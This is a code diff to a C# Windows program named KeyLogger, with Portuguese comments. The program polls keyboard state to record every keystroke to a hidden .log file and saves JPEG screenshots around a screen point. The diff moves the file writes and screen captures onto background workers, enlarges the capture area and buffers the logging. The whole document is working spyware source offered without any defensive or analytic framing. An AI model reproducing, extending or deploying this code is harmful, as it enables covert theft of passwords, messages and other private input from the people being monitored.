@@ -1,17 +1,18 @@
-﻿// ReSharper disable HeapView.ObjectAllocation
+﻿// ReSharper disable HeapView.ClosureAllocation
+// ReSharper disable HeapView.DelegateAllocation
+// ReSharper disable HeapView.ObjectAllocation
 // ReSharper disable HeapView.ObjectAllocation.Evident
 // ReSharper disable HeapView.ObjectAllocation.Possible
 // ReSharper disable ObjectCreationAsStatement
 // ReSharper disable HeapView.BoxingAllocation
 
 using System;
+using System.ComponentModel;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Reflection;
-using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
-using System.Threading;
 using System.Windows.Forms;
 using Timer = System.Threading.Timer;
 
@@ -44,6 +45,21 @@ namespace KeyLogger
         private static readonly string Filename = Assembly.GetExecutingAssembly().Location + ".log";
 
         /// <summary>
+        /// Buffer para gravar no arquivo.
+        /// </summary>
+        private static string _buffer = string.Empty;
+
+        /// <summary>
+        /// Sinaliza escrita do buffer em andamento.
+        /// </summary>
+        private static bool _bufferWriting;
+
+        /// <summary>
+        /// Retângulo para captura da tela.
+        /// </summary>
+        private static Rectangle _capture = Rectangle.Empty;
+
+        /// <summary>
         /// Ponto de entrada da execução do programa.
         /// </summary>
         private static void Main()
@@ -56,15 +72,7 @@ namespace KeyLogger
                     if (GetAsyncKeyState(key) != -32767) continue;
                     var keyName = GetKeyName(key, true);
                     Console.Write(keyName);
-                    try
-                    {
-                        File.AppendAllText(Filename, keyName);
-                    }
-                    catch (Exception ex)
-                    {
-                        // Ignora se não conseguir escrever no arquivo.
-                        Console.WriteLine("ERROR: {0}", ex);
-                    }
+                    WriteOnFile(keyName);
                 }
             }, null, TimeSpan.Zero, TimeSpan.FromMilliseconds(10));
             
@@ -108,29 +116,68 @@ namespace KeyLogger
         /// </summary>
         /// <param name="center">Posição central.</param>
         /// <param name="radius">Raio da área capturada. Embora seja retangular.</param>
-        private static string PrintScreen(Point center, int radius = 100)
+        private static string PrintScreen(Point center, int radius = 200)
         {
-            try
-            {
-                using (var bitmap = new Bitmap(radius, radius))
-                {
-                    using (var graphics = Graphics.FromImage(bitmap))
-                    {
-                        graphics.CopyFromScreen(new Point(center.X - radius / 2, center.Y - radius / 2), Point.Empty,
-                            new Size(radius, radius));
-                    }
+            if (!_capture.IsEmpty) return string.Empty;
+            
+            _capture = new Rectangle(center.X - radius / 2, center.Y - radius / 2, radius, radius);
+            var file = new FileInfo($"{Filename}.{DateTime.Now:yyyy-MM-dd-HH-mm-ss}.jpg");
 
-                    var file = new FileInfo($"{Filename}.{DateTime.Now:yyyy-MM-dd-HH-mm-ss}.jpg");
-                    bitmap.Save(file.FullName, ImageFormat.Jpeg);
-                    return file.Name;
-                }
-            }
-            catch (Exception ex)
+            var worker = new BackgroundWorker();
+            worker.DoWork += (sender, args) =>
             {
-                // Ignora se não conseguir capturar a tela.
-                Console.WriteLine("ERROR: {0}", ex);
-                return string.Empty;
-            }
+                try
+                {
+                    using (var bitmap = new Bitmap(_capture.Width, _capture.Height))
+                    {
+                        using (var graphics = Graphics.FromImage(bitmap))
+                        {
+                            graphics.CopyFromScreen(_capture.Location, Point.Empty, _capture.Size);
+                        }
+                        bitmap.Save(file.FullName, ImageFormat.Jpeg);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    // Ignora se não conseguir capturar a tela.
+                    Console.WriteLine("ERROR: {0}", ex);
+                }
+                _capture = Rectangle.Empty;
+            };
+            worker.RunWorkerAsync();
+
+            return file.Name;
+        }
+
+        /// <summary>
+        /// Escreve o buffer em arquivo.
+        /// </summary>
+        /// <param name="text">Texto para escrita no arquivo.</param>
+        private static void WriteOnFile(string text)
+        {
+            _buffer += text;
+
+            if (_bufferWriting) return;
+            _bufferWriting = true;
+
+            var buffer = _buffer;
+            _buffer = string.Empty;
+
+            var worker = new BackgroundWorker();
+            worker.DoWork += (sender, args) =>
+            {
+                try
+                {
+                    File.AppendAllText(Filename, buffer);
+                    _bufferWriting = false;
+                }
+                catch (Exception ex)
+                {
+                    // Ignora se não conseguir escrever no arquivo.
+                    Console.WriteLine("ERROR: {0}", ex);
+                }
+            };
+            worker.RunWorkerAsync();
         }
     }
 }
